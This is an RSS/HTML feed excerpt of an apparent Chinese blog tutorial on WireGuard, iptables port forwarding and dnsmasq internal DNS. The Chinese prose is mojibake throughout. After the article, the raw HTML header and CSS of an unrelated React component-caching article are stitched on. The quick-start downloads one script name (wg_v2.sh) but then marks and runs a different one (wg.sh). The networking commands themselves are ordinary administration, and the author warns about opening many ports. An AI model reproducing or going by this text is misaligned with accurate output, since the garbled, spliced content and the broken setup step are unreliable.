æœ€åç”¨ <strong>WireGuard + iptables + dnsmasq</strong> ä¸‰ä»¶å¥—æå®šï¼Œ<strong>ç¨³å®šè¿è¡Œä¸€å¹´</strong>ï¼Œåˆ†äº«ç»™å¤§å®¶ã€‚</p>
<hr/>
<h3 data-id="heading-1">ğŸ¯ æœ¬æ•™ç¨‹å¯å®ç°ï¼š</h3>

























<table><thead><tr><th>åŠŸèƒ½</th><th>è¯´æ˜</th><th>ä½“éªŒ</th></tr></thead><tbody><tr><td><strong>å¼‚åœ°ç»„ç½‘</strong></td><td>P2Pç›´è¿ï¼Œå¤±è´¥è‡ªåŠ¨ä¸­ç»§</td><td>å»¶è¿Ÿ10-60msï¼Œè¿œç¨‹æ¡Œé¢æµç•…</td></tr><tr><td><strong>ç«¯å£æ˜ å°„</strong></td><td>iptablesè½¬å‘ï¼Œæ— éœ€é¢å¤–å·¥å…·</td><td>å¯è½¬å‘å…¨ç«¯å£ï¼ŒæœåŠ¡å™¨å ç”¨&lt;10%</td></tr><tr><td><strong>å†…ç½‘DNS</strong></td><td>è‡ªå®šä¹‰åŸŸåè®¿é—®å†…ç½‘è®¾å¤‡</td><td><code>my.pc.home</code> ç›´æ¥è®¿é—®</td></tr></tbody></table>
<blockquote>
<p>ğŸ“Œ <strong>é€‚åˆäººç¾¤</strong>ï¼šæœ‰äº‘æœåŠ¡å™¨ã€éœ€è¦è¿œç¨‹è®¿é—®å†…ç½‘æœåŠ¡ã€å–œæ¬¢è‡ªå»ºè§£å†³æ–¹æ¡ˆçš„ç©å®¶ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">ğŸš€ å¿«é€Ÿå¼€å§‹</h2>
<p>å¦‚æœä½ ä¸æƒ³çœ‹é•¿ç¯‡æ•™ç¨‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€é”®è„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½è„šæœ¬</span>
wget https://raw.githubusercontent.com/kira9924/wireguard-setup/refs/heads/main/wg_v2.sh
<span class="hljs-built_in">chmod</span> +x wg.sh

<span class="hljs-comment"># äº¤äº’å¼èœå•</span>
./wg.sh
è„šæœ¬æ”¯æŒï¼šè‡ªåŠ¨åˆå§‹åŒ–é…ç½®ã€ç”Ÿæˆå®¢æˆ·ç«¯ã€ç«¯å£è½¬å‘ç®¡ç†ã€SSHå®‰å…¨åŠ å›ºç­‰ã€‚
ç‚¹å‡»æŸ¥çœ‹å®Œæ•´è„šæœ¬æºç 

âš ï¸ æ³¨æ„ï¼šè„šæœ¬ä¼šä¿®æ”¹SSHé…ç½®ï¼Œå»ºè®®å…ˆé€šè¯»æ–‡æ¡£å†ä½¿ç”¨ï¼
</code></pre>
<h2 data-id="heading-3">ğŸ“¦ åŸºç¡€éƒ¨ç½²ï¼šWireGuardå¼‚åœ°ç»„ç½‘</h2>
<h3 data-id="heading-4">1. å®‰è£…ä¾èµ–ï¼ˆUbuntuï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">apt update
apt install -y wireguard iptables lsof
</code></pre>
<h3 data-id="heading-5">2. ç”Ÿæˆå¯†é’¥å¯¹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœåŠ¡ç«¯å¯†é’¥</span>
wg genkey | <span class="hljs-built_in">tee</span> /etc/wireguard/server_private.key | wg pubkey &gt; /etc/wireguard/server_public.key

<span class="hljs-comment"># å®¢æˆ·ç«¯å¯†é’¥ï¼ˆç¤ºä¾‹ï¼‰</span>
wg genkey | <span class="hljs-built_in">tee</span> /etc/wireguard/client_private.key | wg pubkey &gt; /etc/wireguard/client_public.key
</code></pre>
<h3 data-id="heading-6">3. æœåŠ¡ç«¯é…ç½®ï¼ˆ/etc/wireguard/wg0.confï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Interface]</span>
<span class="hljs-attr">PrivateKey</span> = &lt;server_private_key&gt;
<span class="hljs-attr">Address</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span>/<span class="hljs-number">24</span>
<span class="hljs-attr">ListenPort</span> = <span class="hljs-number">50814</span>
<span class="hljs-attr">DNS</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span>
<span class="hljs-attr">MTU</span> = <span class="hljs-number">1420</span>
<span class="hljs-attr">PostUp</span> = /etc/wireguard/iptable-up.sh
<span class="hljs-attr">PostDown</span> = /etc/wireguard/iptable-down.sh

<span class="hljs-section">[Peer]</span>
<span class="hljs-comment"># å®¢æˆ·ç«¯1</span>
<span class="hljs-attr">PublicKey</span> = &lt;client1_public_key&gt;
<span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.10</span>/<span class="hljs-number">32</span>
<span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span>

<span class="hljs-section">[Peer]</span>
<span class="hljs-comment"># å®¢æˆ·ç«¯2</span>
<span class="hljs-attr">PublicKey</span> = &lt;client2_public_key&gt;
<span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.11</span>/<span class="hljs-number">32</span>
<span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span>
ğŸ’¡ æç¤ºï¼šPersistentKeepalive æ˜¯P2Pè¿æ¥çš„å…³é”®ï¼Œä¿æŒ25ç§’å¿ƒè·³å¯ç©¿é€å¤§éƒ¨åˆ†NATã€‚
</code></pre>
<h3 data-id="heading-7">4. é…ç½®iptablesè½¬å‘è„šæœ¬</h3>
<p>åˆ›å»º /etc/wireguard/iptable-up.sh å’Œ iptable-down.shï¼Œå†…å®¹è§ iptablesé…ç½®ã€‚</p>
<h3 data-id="heading-8">5. å®¢æˆ·ç«¯é…ç½®</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Interface]</span>
<span class="hljs-attr">PrivateKey</span> = &lt;client_private_key&gt;
<span class="hljs-attr">Address</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.10</span>/<span class="hljs-number">32</span>
<span class="hljs-attr">MTU</span> = <span class="hljs-number">1420</span>
<span class="hljs-attr">DNS</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span>, <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>

<span class="hljs-section">[Peer]</span>
<span class="hljs-attr">PublicKey</span> = &lt;server_public_key&gt;
<span class="hljs-attr">Endpoint</span> = ä½ çš„å…¬ç½‘IP:<span class="hljs-number">50814</span>
<span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.0</span>.<span class="hljs-number">8.0</span>/<span class="hljs-number">24</span>
<span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span>
</code></pre>
<h3 data-id="heading-9">6. å¯åŠ¨ä¸æµ‹è¯•</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨æœåŠ¡ç«¯</span>
wg-quick up wg0

<span class="hljs-comment"># æŸ¥çœ‹çŠ¶æ€</span>
wg show

<span class="hljs-comment"># æµ‹è¯•è¿é€šæ€§ï¼ˆä»å®¢æˆ·ç«¯ï¼‰</span>
ping 10.0.8.1
</code></pre>
<h2 data-id="heading-10">ğŸŒ‰ è¿›é˜¶åŠŸèƒ½1ï¼šå†…ç½‘ç«¯å£æ˜ å°„</h2>
<p>æ—¢ç„¶è®¾å¤‡å·²ç»ç»„ç½‘ï¼Œå°±å¯ä»¥é€šè¿‡iptableså°†å†…ç½‘ç«¯å£æš´éœ²åˆ°å…¬ç½‘ã€‚</p>
<ul>
<li>ä¸ºä»€ä¹ˆéœ€è¦ç«¯å£æ˜ å°„ï¼Ÿ</li>
<li>å°†å®¶é‡Œçš„NASç½‘é¡µç•Œé¢æš´éœ²åˆ°å…¬ç½‘</li>
<li>è¿œç¨‹æ¡Œé¢è®¿é—®å…¬å¸ç”µè„‘</li>
<li>æ­å»ºè‡ªå·±çš„ç½‘ç«™/æœåŠ¡</li>
</ul>
<h3 data-id="heading-11">å•ç«¯å£è½¬å‘ç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°†å…¬ç½‘8080ç«¯å£è½¬å‘åˆ°10.0.8.10:8080</span>
iptables -t nat -A WG-FORWARD-NAT -p tcp --dport 8080 -j DNAT --to 10.0.8.10:8080
iptables -t nat -A POSTROUTING -p tcp -d 10.0.8.10 --dport 8080 -j SNAT --to 10.0.8.1
iptables -A WG-FORWARD-FW -p tcp -d 10.0.8.10 --dport 8080 -j ACCEPT
</code></pre>
<h3 data-id="heading-12">æ‰¹é‡ç«¯å£è½¬å‘</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆè§„åˆ™æ–‡ä»¶ï¼ˆç¤ºä¾‹ï¼š10000-10010ç«¯å£ï¼‰</span>
*nat
-A WG-FORWARD-NAT -p tcp --dport 10000 -j DNAT --to 10.0.8.10:10000
-A POSTROUTING -p tcp -d 10.0.8.10 --dport 10000 -j SNAT --to 10.0.8.1
COMMIT
*filter
-A WG-FORWARD-FW -p tcp -d 10.0.8.10 --dport 10000 -j ACCEPT
COMMIT
<span class="hljs-comment"># å¯¼å…¥è§„åˆ™</span>
iptables-restore --noflush &lt; rules.txt
</code></pre>
<blockquote>
<p>âš ï¸ é‡è¦æé†’ï¼š</p>
<ol>
<li>éœ€è¦åœ¨äº‘æœåŠ¡å™¨æ§åˆ¶å°é˜²ç«å¢™/å®‰å…¨ç»„ä¸­æ”¾è¡Œå¯¹åº”ç«¯å£</li>
<li>å…¨ç«¯å£è½¬å‘å­˜åœ¨å®‰å…¨é£é™©ï¼Œå»ºè®®ä»…å¼€æ”¾å¿…è¦ç«¯å£</li>
<li>å¯ä»¥ä½¿ç”¨è„šæœ¬çš„æ‰¹é‡è½¬å‘åŠŸèƒ½ï¼Œæ”¯æŒéšæœºç«¯å£ã€èŒƒå›´ç«¯å£ç­‰</li>
</ol>
</blockquote>
<h2 data-id="heading-13">ğŸ”— è¿›é˜¶åŠŸèƒ½2ï¼šå†…ç½‘è‡ªå®šä¹‰DNS</h2>
<p>è®°ä½ <code>10.0.8.10</code> è¿™ç§IPå¤ªåäººç±»ï¼Œæˆ‘ä»¬éœ€è¦å¥½è®°çš„åŸŸåã€‚</p>
<h3 data-id="heading-14">ä¸ºä»€ä¹ˆéœ€è¦è‡ªå»ºDNSï¼Ÿ</h3>
<ul>
<li><code>my.pc.home</code> æ¯” <code>10.0.8.10</code> å¥½è®°</li>
<li>è®¾å¤‡å¤šäº†ä¸ç”¨è®°IPè¡¨</li>
<li>æµè§ˆå™¨ç›´æ¥è¾“å…¥åŸŸåè®¿é—®</li>
</ul>
<h3 data-id="heading-15">å®‰è£…é…ç½®dnsmasq</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœæ­¢ç³»ç»Ÿè‡ªå¸¦çš„DNSæœåŠ¡</span>
sudo systemctl stop systemd-resolved
sudo systemctl <span class="hljs-built_in">disable</span> systemd-resolved

<span class="hljs-comment"># å®‰è£…dnsmasq</span>
sudo apt install dnsmasq -y
</code></pre>
<h3 data-id="heading-16">é…ç½®dnsmasq</h3>
<p>ç¼–è¾‘ /etc/dnsmasq.confï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä»…ç›‘å¬WGç½‘ç»œ</span>
<span class="hljs-attr">interface</span>=wg0
<span class="hljs-attr">listen-address</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span>
bind-interfaces

<span class="hljs-comment"># è‡ªå®šä¹‰åŸŸåæ–‡ä»¶</span>
<span class="hljs-attr">addn-hosts</span>=/etc/dnsmasq.hosts

<span class="hljs-comment"># å¤–ç½‘DNSå…œåº•</span>
<span class="hljs-attr">server</span>=<span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>
<span class="hljs-attr">server</span>=<span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span>

<span class="hljs-comment"># æ€§èƒ½ä¼˜åŒ–</span>
<span class="hljs-attr">cache-size</span>=<span class="hljs-number">1000</span>
no-resolv
no-poll
</code></pre>
<p>###æ·»åŠ è‡ªå®šä¹‰åŸŸå
ç¼–è¾‘ /etc/dnsmasq.hostsï¼š</p>
<pre><code class="hljs language-ini" lang="ini">10.0.8.10 my.desktop.home
10.0.8.11 my.thinkpad.home
10.0.8.20 my.nas.home
</code></pre>
<h3 data-id="heading-17">éªŒè¯DNSè§£æ</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœåŠ¡ç«¯æµ‹è¯•</span>
nslookup my.desktop.home 10.0.8.1

<span class="hljs-comment"># å®¢æˆ·ç«¯æµ‹è¯•ï¼ˆéœ€é…ç½®DNSä¸º10.0.8.1ï¼‰</span>
nslookup my.desktop.home
ğŸš€ æŠ€å·§ï¼šä½ å¯ä»¥ç”¨ home ä½œä¸ºé¡¶çº§åŸŸåï¼Œå®Œå…¨è‡ªå·±æŒæ§ï¼Œæ¯”å¦‚ nas.homeã€router.home ç­‰ã€‚
</code></pre>
<h3 data-id="heading-18">âš™ï¸ ä¸€é”®ç®¡ç†è„šæœ¬ï¼ˆwg.shï¼‰è¯¦è§£</h3>
<p>æ‰‹åŠ¨æ“ä½œå¤ªç¹çï¼Ÿæˆ‘å†™äº†è¿™ä¸ªå…¨åŠŸèƒ½ç®¡ç†è„šæœ¬ã€‚</p>
<h4 data-id="heading-19">è„šæœ¬åŠŸèƒ½æ¦‚è§ˆ</h4>





























<table><thead><tr><th>åŠŸèƒ½æ¨¡å—</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>WGç®¡ç†</td><td>å¯åŠ¨/åœæ­¢/é‡å¯/çŠ¶æ€æŸ¥çœ‹</td></tr><tr><td>å®¢æˆ·ç«¯ç”Ÿæˆ</td><td>ä¸€é”®ç”Ÿæˆå¤šä¸ªå®¢æˆ·ç«¯é…ç½®</td></tr><tr><td>ç«¯å£è½¬å‘</td><td>å•ç«¯å£ã€èŒƒå›´ç«¯å£ã€éšæœºç«¯å£è½¬å‘</td></tr><tr><td>SSHå®‰å…¨</td><td>é™åˆ¶SSHä»…WGç½‘ç»œå¯è®¿é—®</td></tr><tr><td>ç½‘ç»œé…ç½®</td><td>è‡ªå®šä¹‰IPæ®µã€å­ç½‘ç­‰</td></tr></tbody></table>
<h4 data-id="heading-20">ä½¿ç”¨æ–¹æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. äº¤äº’å¼èœå•ï¼ˆæ¨èæ–°æ‰‹ï¼‰</span>
./wg.sh

<span class="hljs-comment"># 2. å‘½ä»¤è¡Œå¿«é€Ÿæ“ä½œ</span>
./wg.sh start          <span class="hljs-comment"># å¯åŠ¨WG</span>
./wg.sh client         <span class="hljs-comment"># ç”Ÿæˆå®¢æˆ·ç«¯é…ç½®</span>
./wg.sh forward        <span class="hljs-comment"># ç«¯å£è½¬å‘ç®¡ç†</span>
./wg.sh config-ssh     <span class="hljs-comment"># åŠ å›ºSSHï¼ˆä»…WGç½‘ç»œå¯è®¿é—®ï¼‰</span>
è„šæœ¬ç•Œé¢é¢„è§ˆ
text
==================== WireGuard å…¨åŠŸèƒ½ç®¡ç†è„šæœ¬ ====================
1. å¯åŠ¨ WG
2. åœæ­¢ WG
3. é‡å¯ WG
4. æŸ¥çœ‹ WG/SSH/è½¬å‘ çŠ¶æ€
5. ç«¯å£è½¬å‘ç®¡ç†
6. ç”Ÿæˆå®¢æˆ·ç«¯é…ç½®
7. åˆå§‹åŒ–/é‡ç½®WireGuardé…ç½®
8. æ‰¹é‡æ·»åŠ å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨
9. é…ç½® SSH ä»…ç›‘å¬ WG IP
10. æ¢å¤ SSH å…¬ç½‘è®¿é—®
11. é…ç½®ç½‘ç»œå‚æ•°
12. é€€å‡º
===============================================================
è¯·é€‰æ‹©æ“ä½œ [1-12]:
ç‚¹å‡»æŸ¥çœ‹å®Œæ•´è„šæœ¬æºç 
</code></pre>
<h3 data-id="heading-21">â“ å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<ol>
<li>
<p>SSHè¢«é¢‘ç¹æ‰«ææ€ä¹ˆåŠï¼Ÿ</p>
<p><strong>é—®é¢˜</strong>ï¼šäº‘æœåŠ¡å™¨22ç«¯å£è¢«çˆ†ç ´ï¼Œæ—¥å¿—æ»¡æ˜¯å¤±è´¥å°è¯•ã€‚</p>
<p><strong>è§£å†³</strong>ï¼šä½¿ç”¨è„šæœ¬çš„ <code>é…ç½® SSH ä»…ç›‘å¬ WG IP</code> åŠŸèƒ½ï¼Œè®©SSHåªç›‘å¬WGå†…ç½‘IPï¼ˆå¦‚ 10.0.8.1:22ï¼‰ã€‚
è¿™æ ·åªæœ‰è¿æ¥äº†WGçš„å®¢æˆ·ç«¯æ‰èƒ½SSHç™»å½•ï¼Œå…¬ç½‘æ— æ³•è®¿é—®ã€‚</p>
</li>
<li>
<p>è·¨è¿è¥å•†P2Pä¸é€šï¼Ÿ
é—®é¢˜ï¼šç”µä¿¡-ç§»åŠ¨ä¹‹é—´ç›´è¿å¤±è´¥ã€‚
è§£å†³ï¼šè¿™æ˜¯NATç©¿é€çš„ç¡¬ä¼¤ï¼Œä¸¤ç§æ–¹æ¡ˆï¼š</p>
</li>
</ol>
<ul>
<li>å¼€å¯ PersistentKeepalive = 25ï¼ˆå·²é…ç½®ï¼‰</li>
<li>æ¥å—èµ°æœåŠ¡å™¨ä¸­ç»§ï¼ˆå»¶è¿Ÿ40-60msï¼Œä¾ç„¶å¯ç”¨ï¼‰</li>
</ul>
<ol start="3">
<li>å®¢æˆ·ç«¯è¿ä¸ä¸Šï¼Ÿ
æ’æŸ¥æ­¥éª¤ï¼š</li>
</ol>
<ul>
<li>æ£€æŸ¥æœåŠ¡ç«¯ wg show å‘½ä»¤æ˜¯å¦æœ‰å®¢æˆ·ç«¯æ¡æ‰‹</li>
<li>ç¡®è®¤äº‘æœåŠ¡å™¨é˜²ç«å¢™å¼€æ”¾äº† 50814 ç«¯å£ï¼ˆUDPï¼‰</li>
<li>æ£€æŸ¥å®¢æˆ·ç«¯é…ç½®çš„Endpointæ˜¯å¦æ­£ç¡®</li>
</ul>
<ol start="4">
<li>
<p>ç«¯å£è½¬å‘ä¸ç”Ÿæ•ˆï¼Ÿ
å¯èƒ½åŸå› ï¼š
äº‘æœåŠ¡å•†å®‰å…¨ç»„æœªæ”¾è¡Œ
iptablesè§„åˆ™æœªæ­£ç¡®æ·»åŠ 
ç›®æ ‡æœåŠ¡æœªç›‘å¬æˆ–é˜²ç«å¢™é˜»æŒ¡</p>
</li>
<li>
<p>DNSè§£æå¤±è´¥ï¼Ÿ
æ£€æŸ¥é¡¹ï¼š</p>
</li>
</ol>
<ul>
<li>å®¢æˆ·ç«¯DNSæ˜¯å¦é…ç½®ä¸º 10.0.8.1</li>
<li>dnsmasqæ˜¯å¦æ­£å¸¸è¿è¡Œ systemctl status dnsmasq</li>
<li>åŸŸåæ˜¯å¦æ·»åŠ åˆ°äº† /etc/dnsmasq.hosts</li>
</ul>
<h3 data-id="heading-22">ğŸ“Š æ€§èƒ½å®æµ‹æ•°æ®</h3>





























<table><thead><tr><th>åœºæ™¯</th><th>å»¶è¿Ÿ</th><th>å¸¦å®½</th><th>ä½“éªŒ</th></tr></thead><tbody><tr><td>åŒè¿è¥å•†P2P</td><td>8-15ms</td><td>æ‰“æ»¡å®¶ç”¨ä¸Šè¡Œ</td><td>è¿œç¨‹æ¡Œé¢æ— æ„Ÿ</td></tr><tr><td>è·¨è¿è¥å•†ä¸­ç»§</td><td>40-60ms</td><td>æ‰“æ»¡å®¶ç”¨ä¸Šè¡Œ</td><td>è½»åº¦æ¸¸æˆå¯ç©</td></tr><tr><td>æ–‡ä»¶ä¼ è¾“</td><td>-</td><td>7MB/s</td><td>å®¶ç”¨å®½å¸¦åŸºæœ¬è·‘æ»¡</td></tr></tbody></table>
<h3 data-id="heading-23">ğŸ“Œ æˆ‘çš„ä½¿ç”¨åœºæ™¯ï¼š</h3>
<ul>
<li>sshè¿œç¨‹å…¬å¸è¿å…¬å¸ç”µè„‘Dockerå¼€å‘ç¯å¢ƒ, ä½“éªŒæ¥è¿‘æœ¬åœ°</li>
<li>è¿œç¨‹æ¡Œé¢å®¶é‡Œå°å¼æœº, åˆä¼‘Macä¹Ÿå¯ä»¥å¼€ä¸€æŠŠç‚‰çŸ³</li>
<li>æ­å»ºæ–‡ä»¶æœåŠ¡å™¨æ˜ å°„åˆ°å…¬ç½‘, æœ‹å‹é›¶é…ç½®ä½¿ç”¨, é€Ÿåº¦è·‘æ»¡å®½å¸¦ä¸Šä¼ é€Ÿåº¦</li>
<li>è®¿é—®å®¶é‡ŒNasçœ‹ç”µå½±, æµç•…2k</li>
</ul>
<h3 data-id="heading-24">ğŸ’¬ æœ€åçš„è¯</h3>
<p>è¿™å¥—æ–¹æ¡ˆæˆ‘å·²ç»ç¨³å®šä½¿ç”¨ä¸€å¹´å¤šï¼Œä»æœ€åˆçš„ç®€å•ç»„ç½‘ï¼Œæ…¢æ…¢åŠ å…¥äº†ç«¯å£æ˜ å°„ã€è‡ªå®šä¹‰DNSï¼Œæœ€åå†™æˆäº†ç®¡ç†è„šæœ¬ã€‚</p>
<p>å®ƒçš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<p>âœ… è½»é‡ï¼šWireGuardå†…æ ¸æ¨¡å—ï¼Œèµ„æºå ç”¨æä½</p>
<p>âœ… çµæ´»ï¼šå¯æŒ‰éœ€é…ç½®æµé‡è·¯ç”±</p>
<p>âœ… åŠŸèƒ½å®Œæ•´ï¼šç»„ç½‘ã€æ˜ å°„ã€DNSä¸€ç«™å¼è§£å†³</p>
<p>å¦‚æœä½ åœ¨éƒ¨ç½²ä¸­é‡åˆ°é—®é¢˜ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ã€‚
å¦‚æœè§‰å¾—æœ‰ç”¨ï¼Œå¯ä»¥æ”¶è—æœ¬æ–‡ï¼Œæˆ–åˆ†äº«ç»™æœ‰åŒæ ·éœ€æ±‚çš„æœ‹å‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React ç»„ä»¶ç¼“å­˜å®æˆ˜æŒ‡å—ï¼šä»æ‰‹å†™ KeepAlive åˆ° react-activation æ·±åº¦åº”ç”¨]]></title>    <link>https://juejin.cn/post/7600318091832000539</link>    <guid>https://juejin.cn/post/7600318091832000539</guid>    <pubDate>2026-01-29T05:54:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600318091832000539" data-draft-id="7600260767688359962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React ç»„ä»¶ç¼“å­˜å®æˆ˜æŒ‡å—ï¼šä»æ‰‹å†™ KeepAlive åˆ° react-activation æ·±åº¦åº”ç”¨"/> <meta itemprop="keywords" content="React.js,æ€§èƒ½ä¼˜åŒ–,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T05:54:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xhxxx"/> <meta itemprop="url" content="https://juejin.cn/user/3235201610941578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React ç»„ä»¶ç¼“å­˜å®æˆ˜æŒ‡å—ï¼šä»æ‰‹å†™ KeepAlive åˆ° react-activation æ·±åº¦åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3235201610941578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xhxxx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:54:47.000Z" title="Thu Jan 29 2026 05:54:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 